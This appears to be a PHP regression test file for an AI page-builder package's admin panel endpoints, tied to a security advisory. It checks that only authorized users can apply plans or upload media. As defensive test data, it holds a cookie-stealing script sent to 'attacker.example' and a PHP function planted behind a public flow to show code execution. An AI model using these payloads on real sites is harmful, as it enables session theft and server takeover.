<?php

declare(strict_types=1);

/*
 * The in-panel HTTP endpoints (routes/panel.php) — GHSA-hj3q-8gc4-6mpw, F2.
 *
 * Being signed in on the host's default guard is not enough: the user must be
 * a Filament user allowed into the Synapse panel AND hold `synapse.admin`.
 * An AI-chat apply that adds a PHP-runtime function also needs
 * `synapse.manage-code`. The check cannot be dropped by an old config.
 */

use Andre\AiPageBuilder\AiPageBuilderServiceProvider;
use Andre\AiPageBuilder\Http\Middleware\EnsureSynapseAdmin;
use Andre\AiPageBuilder\Models\FlowFunction;
use Andre\AiPageBuilder\Models\MediaItem;
use Andre\AiPageBuilder\Models\Page;
use Andre\AiPageBuilder\Tests\Fixtures\User;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;

/** A host-app customer: logged in on `web`, but not a Filament panel user. */
function hostCustomer(): User
{
    return new User(['name' => 'Customer', 'email' => 'customer@example.test']);
}

/** @return array<string,mixed> A plan that plants a PHP function behind a public flow. */
function phpFunctionPlan(string $marker): array
{
    return [
        'functions' => [[
            'slug' => 'pwn', 'name' => 'pwn', 'runtime' => 'php',
            'body' => 'file_put_contents('.var_export($marker, true).', php_uname()); return 1;',
        ]],
        'flows' => [[
            'slug' => 'pwn-flow', 'name' => 'pwn', 'trigger_type' => 'api', 'is_public' => true,
            'definition' => [
                'start' => 't',
                'nodes' => [
                    't' => ['type' => 'trigger', 'next' => ['f']],
                    'f' => ['type' => 'function', 'config' => ['function' => 'pwn', 'args' => [], 'output' => 'out']],
                ],
            ],
        ]],
    ];
}

/** @return array<string,array{0:string,1:array<string,mixed>}> */
function panelEndpoints(): array
{
    return [
        'ai-chat' => ['/ai-page-builder/ai-chat', ['messages' => [['role' => 'user', 'content' => 'hi']]]],
        'ai-chat apply' => ['/ai-page-builder/ai-chat/apply', ['plan' => ['pages' => [['slug' => 'x', 'title' => 'X', 'html' => '<p>x</p>']]]]],
        'media upload' => ['/ai-page-builder/media/upload', ['files' => [UploadedFile::fake()->create('a.png', 1, 'image/png')]]],
        'php lint' => ['/ai-page-builder/lint/php', ['code' => 'echo 1;']],
    ];
}

it('rejects a non-panel host user and leaves the published page untouched', function (): void {
    Page::query()->create(['title' => 'Home', 'slug' => 'home', 'status' => 'published', 'html' => '<h1>Welcome</h1>']);

    $res = $this->actingAs(hostCustomer())->postJson('/ai-page-builder/ai-chat/apply', [
        'plan' => ['pages' => [[
            'slug' => 'home', 'title' => 'Home', 'status' => 'published', 'html' => '<h1>Welcome</h1>',
            'custom_js' => 'fetch("https://attacker.example/c?"+document.cookie)',
        ]]],
    ]);

    $res->assertForbidden();
    $this->get('/p/home')->assertDontSee('attacker.example', false);
});

it('does not let a non-panel host user plant a PHP function behind a public flow', function (): void {
    config()->set('ai-page-builder.flow.allow_php_functions', true);
    $marker = sys_get_temp_dir().'/pb_panel_rce_'.getmypid();
    @unlink($marker);

    $this->actingAs(hostCustomer())
        ->postJson('/ai-page-builder/ai-chat/apply', ['plan' => phpFunctionPlan($marker)])
        ->assertForbidden();

    auth()->logout();
    $this->postJson('/pb-flow/pwn-flow', ['input' => []]);

    $executed = is_file($marker);
    @unlink($marker);

    expect($executed)->toBeFalse()
        ->and(FlowFunction::query()->where('slug', 'pwn')->exists())->toBeFalse();
});

it('rejects every endpoint for a panel user the host has not granted', function (string $uri, array $payload): void {
    Storage::fake('public');
    $this->actingAs(panelStaff());

    $this->post($uri, $payload, ['Accept' => 'application/json'])->assertForbidden();
    expect(MediaItem::query()->count())->toBe(0);
})->with(panelEndpoints());

it('rejects a granted user the host keeps out of its panel', function (string $uri, array $payload): void {
    Storage::fake('public');
    $this->actingAs(synapseAdmin(['can_access_panel' => false]));

    $this->post($uri, $payload, ['Accept' => 'application/json'])->assertForbidden();
})->with(panelEndpoints());

it('serves a granted panel admin', function (): void {
    $this->actingAs(synapseAdmin());

    $this->postJson('/ai-page-builder/lint/php', ['code' => 'echo 1;'])->assertOk()->assertJsonPath('errors', []);
    $this->postJson('/ai-page-builder/ai-chat/apply', [
        'plan' => ['pages' => [['slug' => 'about', 'title' => 'About', 'status' => 'published', 'html' => '<p>x</p>']]],
    ])->assertOk();

    expect(Page::query()->where('slug', 'about')->exists())->toBeTrue();
});

it('requires synapse.manage-code to apply a plan with a PHP function', function (): void {
    Gate::define('synapse.manage-code', fn (): bool => false);
    $this->actingAs(synapseAdmin());

    $this->postJson('/ai-page-builder/ai-chat/apply', ['plan' => phpFunctionPlan('/dev/null')])
        ->assertForbidden();
    expect(FlowFunction::query()->count())->toBe(0);

    // Other functions (and the rest of the plan) still apply.
    $this->postJson('/ai-page-builder/ai-chat/apply', ['plan' => ['functions' => [[
        'slug' => 'double', 'name' => 'double', 'runtime' => 'expression', 'body' => 'x * 2',
    ]]]])->assertOk();
    expect(FlowFunction::query()->where('slug', 'double')->exists())->toBeTrue();
});

it('lets synapse.admin apply a PHP function when manage-code is not separately defined', function (): void {
    $this->actingAs(synapseAdmin());

    $this->postJson('/ai-page-builder/ai-chat/apply', ['plan' => ['functions' => [[
        'slug' => 'php-fn', 'name' => 'php-fn', 'runtime' => 'php', 'body' => 'return 1;',
    ]]]])->assertOk();

    expect(FlowFunction::query()->where('slug', 'php-fn')->exists())->toBeTrue();
});

it('keeps the admin check when a host config published before 2.0 omits it', function (): void {
    config()->set('ai-page-builder.routes.panel_middleware', ['web', 'auth']);
    expect(AiPageBuilderServiceProvider::panelMiddleware())->toBe(['web', 'auth', EnsureSynapseAdmin::class]);

    config()->set('ai-page-builder.routes.panel_middleware', ['web', EnsureSynapseAdmin::class, 'auth']);
    expect(AiPageBuilderServiceProvider::panelMiddleware())->toBe(['web', 'auth', EnsureSynapseAdmin::class]);
});

it('registers every panel route behind the admin check, and throttles the AI chat', function (): void {
    foreach (['media.upload', 'lint.php', 'ai-chat.send', 'ai-chat.apply'] as $name) {
        $middleware = Route::getRoutes()->getByName('ai-page-builder.'.$name)?->gatherMiddleware() ?? [];
        expect($middleware)->toContain(EnsureSynapseAdmin::class, 'auth');
    }

    foreach (['ai-chat.send', 'ai-chat.apply'] as $name) {
        $middleware = Route::getRoutes()->getByName('ai-page-builder.'.$name)->gatherMiddleware();
        expect(collect($middleware)->contains(fn ($m): bool => str_starts_with((string) $m, 'throttle:')))->toBeTrue();
    }
});

it('fails closed when Filament has no panel running Synapse', function (): void {
    $this->actingAs(hostCustomer());
    Gate::define('synapse.admin', fn (): bool => true);

    $this->postJson('/ai-page-builder/lint/php', ['code' => 'echo 1;'])->assertForbidden();
});
